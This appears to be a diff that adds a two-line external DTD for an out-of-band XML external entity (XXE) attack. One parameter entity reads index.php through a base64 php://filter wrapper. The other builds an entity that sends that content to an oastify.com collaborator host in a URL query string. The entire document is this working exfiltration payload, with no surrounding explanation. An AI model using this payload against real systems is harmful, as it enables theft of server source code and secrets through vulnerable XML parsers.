@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file://index.php">
+<!ENTITY % int "<!ENTITY &#x25; send SYSTEM 'http://1324ten5mjqnumamacl57hww0n6hudi2.oastify.com/?p=%file;'>">
